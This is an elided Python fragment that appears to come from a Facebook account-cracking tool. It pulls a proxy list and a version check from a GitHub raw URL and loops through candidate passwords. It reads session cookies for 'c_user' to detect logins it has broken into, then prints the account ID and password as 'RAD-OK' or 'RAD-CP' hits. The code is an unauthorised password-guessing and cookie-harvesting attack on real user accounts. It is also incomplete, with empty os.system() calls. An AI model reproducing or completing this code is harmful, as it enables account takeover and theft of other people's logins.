...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/Tajul-14/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Tajul-14/files/main/version.txt').text
    if str(v) in update:
        os.system()
        os.system()
        os.system()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[RAD-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[RAD-CP] '+cid+' | '+ps+'\033[0;97m')
